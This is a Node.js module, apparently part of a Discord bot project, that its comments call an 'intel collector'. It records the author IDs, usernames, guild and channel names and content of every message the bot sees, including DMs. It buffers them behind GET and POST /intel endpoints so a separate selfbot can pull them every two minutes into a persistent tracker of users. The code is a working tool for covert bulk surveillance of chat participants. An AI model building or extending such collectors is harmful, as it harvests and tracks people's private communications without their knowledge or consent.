const fs = require('fs');
const path = require('path');

// Intel collector for gambot — runs 24/7 on Render.
// The gambot is a BOT (discord.js v14) with GuildMessages + MessageContent
// intents, so it passively sees every message in every guild it's in plus DMs
// users send it. It records message events into an in-memory ring buffer that
// the selfbot (discord-selfy) pulls every ~2 min via GET /intel?since=<ms> and
// merges into its persistent tracker. The bot can also accept pushed events
// via POST /intel so multiple instances share the same feed.
//
// Render free tier wipes ./data on every deploy, so this buffer is in-memory
// (ephemeral) by design — the PC selfbot is the durable store.
const MAX_EVENTS = 20000;
const CONTENT_CAP = 200;

let events = [];
let lastPruned = 0;

function record(ev) {
  if (!ev || !ev.id) return;
  // dedup by message id
  if (events.some(e => e.id === ev.id)) return;
  events.push(ev);
  if (events.length > MAX_EVENTS) {
    events = events.slice(-MAX_EVENTS);
  }
}

// Normalize a raw event into a compact sync record.
function normalize(ev) {
  return {
    id: ev.id,
    t: ev.t || Date.now(),
    type: ev.type || 'message',
    userId: ev.userId || null,
    username: ev.username || null,
    globalName: ev.globalName || null,
    guildId: ev.guildId || null,
    guildName: ev.guildName || null,
    channelId: ev.channelId || null,
    channelName: ev.channelName || null,
    content: ev.content ? String(ev.content).slice(0, CONTENT_CAP) : null,
  };
}

function recordMessage(message) {
  try {
    if (!message.author || message.author.bot) return;
    const ch = message.channel;
    record(normalize({
      id: message.id,
      t: Date.now(),
      type: 'message',
      userId: message.author.id,
      username: message.author.username,
      globalName: message.author.globalName || null,
      guildId: message.guild ? message.guild.id : null,
      guildName: message.guild ? message.guild.name : null,
      channelId: ch ? ch.id : null,
      channelName: ch && ch.name ? ch.name : (ch && ch.type === 1 ? 'dm' : null),
      content: message.content,
    }));
  } catch (_) {}
}

function getSince(since) {
  const s = Number(since) || 0;
  return events.filter(e => e.t > s);
}

// Merge events pushed from another instance (dedup by id).
function merge(incoming) {
  if (!Array.isArray(incoming)) return 0;
  let added = 0;
  for (const raw of incoming) {
    if (!raw || !raw.id) continue;
    if (events.some(e => e.id === raw.id)) continue;
    events.push(normalize(raw));
    added++;
  }
  if (events.length > MAX_EVENTS) events = events.slice(-MAX_EVENTS);
  return added;
}

function stats() {
  return { events: events.length, last: events.length ? events[events.length - 1].t : 0 };
}

function hookClient(client) {
  client.on('messageCreate', recordMessage);
  // prune rarely-needed old events to bound memory
  setInterval(() => {
    const cutoff = Date.now() - 24 * 3600 * 1000; // keep 24h
    if (events.length > MAX_EVENTS / 2) {
      events = events.filter(e => e.t >= cutoff);
    }
  }, 600000);
}

module.exports = { record, recordMessage, getSince, merge, stats, hookClient, normalize, _events: () => events };